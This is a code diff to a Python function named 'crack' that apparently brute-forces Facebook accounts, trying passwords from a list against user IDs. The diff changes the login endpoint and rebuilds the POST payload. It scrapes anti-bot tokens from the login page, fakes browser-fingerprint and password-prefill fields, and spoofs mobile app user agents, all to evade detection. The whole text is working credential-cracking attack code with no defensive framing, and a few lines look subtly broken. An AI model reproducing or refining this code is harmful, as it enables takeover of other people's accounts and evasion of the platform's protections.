@@ -155,7 +155,7 @@ def crack(uid, password_list, total_count):
             device = random.choice(["M910x","D10i","2PXH3","D830x","U-2u","M910x","2PXH3","HTC_Desire_S_S510e","HTC_0P3P5","HTC_DesireHD_X315e","HTC_C715c","HTC_D616w"])
             us = f"[FBAN/FB4A;FBAV/"+facebook_version+";FBPN/com.facebook.katana;FBLC/bn_IN;FBBV/"+bv+";FBCR/Jio;FBMF/redmi;FBBD/redmi;FBDV/"+deevice+";FBSV/"+versi_android+";FBCA/arm64-v8a:null;FBDM/{density=2.0,width=1080,height=2400};FB_FW/1"
             up = f"[FBAN/FB4A;FBAV/"+facebook_version+";FBPN/com.facebook.katana;FBLC/id_ID;FBBV/"+bv+";FBCR/"+fbcr+";FBMF/"+fbmf+";FBBD/"+fbbd+";FBDV/"+model+";FBSV/"+versi_android+";FBCA/arm64-v8a:null;FBDM/"+fbdm+"};FB_FW/1"
-            url1 = "https://m.prod.facebook.com/"
+            url1 = "https://x.prod.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8"
             head = {"authority": "m.prod.facebook.com",
             "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
             "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
@@ -171,18 +171,33 @@ def crack(uid, password_list, total_count):
             "viewport-width": "980"}
             requu1 = Session.get(url1,headers=head)
             log_data = {
-            'jazoest': re.search('name="m_ts" value="(.*?)"',str(requu1.text)).group(1),
-            'lsd': re.search('name="m_ts" value="(.*?)"',str(requu1.text)).group(1),
-            'email': uid,
-            'cred_type': '100',
-            'login_source': 'device_based_login_add_account',
-            'is_reauth_from_account_switcher': '',
-            'savepass': '',
-            'next': '',
-            'persistent': '',
-            'shared_prefs_data': 'eyIzMDAwMCI6W3sidCI6MTc2NTc4MTc2Ni4wOTIsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8ifSwidiI6ZmFsc2V9XSwiMzAwMDEiOlt7InQiOjE3NjU3ODE3NjYuMDkzLCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOjV9XSwiMzAwMDIiOlt7InQiOjE3NjU3ODE3NjYuMDkzLCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOjJ9XSwiMzAwMDMiOlt7InQiOjE3NjU3ODE3NjYuMDkzLCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOlsiZW4tVVMiLCJlbiJdfV0sIjMwMDA0IjpbeyJ0IjoxNzY1NzgxNzY2LjA5MywiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLyJ9LCJ2IjoxMDB9XSwiMzAwMDUiOlt7InQiOjE3NjU3ODE3NjYuMDkzLCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOnsidyI6MTA3MCwiaCI6NzgyfX1dLCIzMDAwNyI6W3sidCI6MTc2NTc4MTc2Ni4wOTQsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8ifSwidiI6ImdyYW50ZWQifV0sIjMwMDA4IjpbeyJ0IjoxNzY1NzgxNzY2LjE3NywiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLyJ9LCJ2IjoiZ3JhbnRlZCJ9XSwiMzAwMTIiOlt7InQiOjE3NjU3ODE3NjYuMDk1LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOiJHb29nbGUgSW5jLiJ9XSwiMzAwMTMiOlt7InQiOjE3NjU3ODE3NjYuMDk2LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOiI1LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzE0My4wLjAuMCBTYWZhcmkvNTM3LjM2IEVkZy8xNDMuMC4wLjAifV0sIjMwMDE1IjpbeyJ0IjoxNzY1NzgxNzY2LjA5NiwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLyJ9LCJ2IjoiV2luMzIifV0sIjMwMDE4IjpbeyJ0IjoxNzY1NzgxNzY2LjA5NiwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLyJ9LCJ2IjoyfV0sIjMwMDIyIjpbeyJ0IjoxNzY1NzgxNzY2LjE1NSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLyJ9LCJ2Ijp0cnVlfV0sIjMwMDQwIjpbeyJ0IjoxNzY1NzgxNzY2LjE1NSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLyJ9LCJ2IjotMzMwfV0sIjMwMDkzIjpbeyJ0IjoxNzY1NzgxNzY2LjE1NSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLyJ9LCJ2IjowfV0sIjMwMDk0IjpbeyJ0IjoxNzY1NzgxNzY2LjE1NiwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLyJ9LCJ2IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzE0My4wLjAuMCBTYWZhcmkvNTM3LjM2IEVkZy8xNDMuMC4wLjAifV0sIjMwMDk1IjpbeyJ0IjoxNzY1NzgxNzY2LjE1NiwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLyJ9LCJ2IjozfV0sIjMwMTA2IjpbeyJ0IjoxNzY1NzgxNzY1Ljk5NCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLyJ9LCJ2IjpmYWxzZX0seyJ0IjoxNzY1NzgxNzY2LjY3LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOnRydWV9XSwiMzAxMDciOlt7InQiOjE3NjU3ODE3NjUuOTk2LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOmZhbHNlfV19',
-            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
-            url = "https://www.facebook.com/login/device-based/regular/login/"
+            'm_ts':re.search('name="m_ts" value="(.*?)"',str(requu1.text)).group(1),
+            'li':re.search('name="li" value="(.*?)"',str(requu1.text)).group(1),
+            'try_number':'0',
+            'unrecognized_tries':'0',
+            'email':uid,
+            'prefill_contact_point':uid,
+            'prefill_source':'browser_dropdown',
+            'prefill_type':'password',
+            'first_prefill_source':'browser_dropdown',
+            'first_prefill_type':'contact_point',
+            'had_cp_prefilled':'true',
+            'had_password_prefilled':'true',
+            'is_smart_lock':'false',
+            'bi_xrwh':re.search('name="bi_xrwh" value="(.*?)"',str(requu1.text)).group(1),
+            'bi_wvdp':'{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
+            'encpass':f'#PWD_BROWSER:0:{int(datetime.datetime.now().timestamp())}:{pw}',
+            'fb_dtsg':re.search('{"dtsg":{"token":"(.*?)"',str(requu1.text)).group(1),
+            'jazoest':re.search('name="jazoest" value="(.*?)"',str(requu1.text)).group(1),
+            'lsd':re.search('name="lsd" value="(.*?)"',str(requu1.text)).group(1),
+            '__dyn':'',
+            '__csr':'',
+            '__req':random.choice(['1', '2', '3', '4', '5', '6', '7', '8', '9']),
+            '__fmt':'1',
+            '__a':re.search('"encrypted":"(.*?)"',str(requ)).group(1),
+            '__user':'0'
+            }
+            url = "https://x.prod.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
             headers = {"authority": "www.facebook.com",
             "method": "POST",
             "path": "/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios&lwv=100",
